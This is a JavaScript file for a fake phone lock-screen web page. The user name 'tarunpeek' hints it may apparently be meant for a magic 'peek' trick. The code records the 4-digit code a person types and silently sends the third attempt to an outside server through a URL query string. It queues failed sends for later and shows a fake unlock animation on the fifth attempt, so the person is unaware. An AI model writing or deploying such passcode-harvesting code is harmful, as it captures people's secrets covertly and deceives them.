// app.js - custom attempt flow:
//  - send only on 3rd attempt
//  - open phone (play animation) on 5th attempt
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');

  // overlay & homescreen elements (must exist in index.html)
  const unlockOverlay = document.getElementById('unlockOverlay');
  const homescreenImg = document.getElementById('homescreenImg');

  // persisted attempt counter key
  const ATT_KEY = '_pass_attempt_count_';
  function getAttempts(){ return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n){ localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots(){ dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length)); }
  function reset(){ code = ""; refreshDots(); }

  function queuePass(pass){
    const q = JSON.parse(localStorage.getItem('_pass_queue_') || '[]');
    q.push({pass, ts: Date.now()});
    localStorage.setItem('_pass_queue_', JSON.stringify(q));
  }

  // send to API (used only on 3rd attempt)
  function sendToAPI(pass){
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => { queuePass(pass); });
  }

  function flushQueue(){
    const qk = '_pass_queue_';
    const queue = JSON.parse(localStorage.getItem(qk) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(qk);
  }

  // Unlock animation: fade/scale lock UI then reveal homescreen overlay
  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;

    // shrink/fade lock UI
    lockEl.classList.add('unlocking');

    // reveal homescreen overlay
    unlockOverlay.classList.add('show');

    // Keep the homescreen visible. If you prefer auto-hide, add a timeout here to remove .show
  }

  // Called after a full 4-digit entry
  async function handleCompleteAttempt(enteredCode) {
    // increment and persist attempts
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // EXACT requirements:
    // - send only on 3rd attempt
    // - open phone (play animation) on 5th attempt
    if (attempts === 3) {
      // send (and queue on failure)
      try {
        await sendToAPI(enteredCode);
      } catch(e){
        // sendToAPI handles queuing; ignore errors here
      }
      // DO NOT animate/open phone on 3rd (per your instruction)
    } else if (attempts === 5) {
      // play the opening animation (no API send)
      playUnlockAnimation();
    } else {
      // attempts 1,2,4 do nothing
    }

    // reset attempt counter after 5th so cycle repeats
    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  // numeric key handling
  keys.forEach(k => k.addEventListener('click', () => {
    const num = k.dataset.num;
    if (!num) return;
    if (code.length >= MAX) return;
    code += num;
    refreshDots();
    if (code.length === MAX) {
      const enteredCode = code;
      setTimeout(() => {
        handleCompleteAttempt(enteredCode);
        reset();
      }, 200);
    }
  }));

  // emergency: visual only
  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // cancel clears input
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  // debug helper
  window.__passUI = { getCode: ()=>code, reset, getAttempts };

})();
/* === Disable pinch & double-tap zoom gestures === */
(function preventZoomGestures() {
  // Prevent the old iOS gesturestart (some browsers)
  window.addEventListener('gesturestart', function(e) {
    e.preventDefault();
  }, { passive: false });

  // Prevent multi-touch pinch zoom by blocking touchmove when >1 touch
  document.addEventListener('touchmove', function(e) {
    if (e.touches && e.touches.length > 1) {
      e.preventDefault();
    }
  }, { passive: false });

  // Extra: prevent double-tap zoom by catching quick consecutive taps
  let lastTouch = 0;
  document.addEventListener('touchend', function(e) {
    const now = Date.now();
    if (now - lastTouch <= 300) {
      // quick second tap — prevent native double-tap-to-zoom
      e.preventDefault();
    }
    lastTouch = now;
  }, { passive: false });
})();
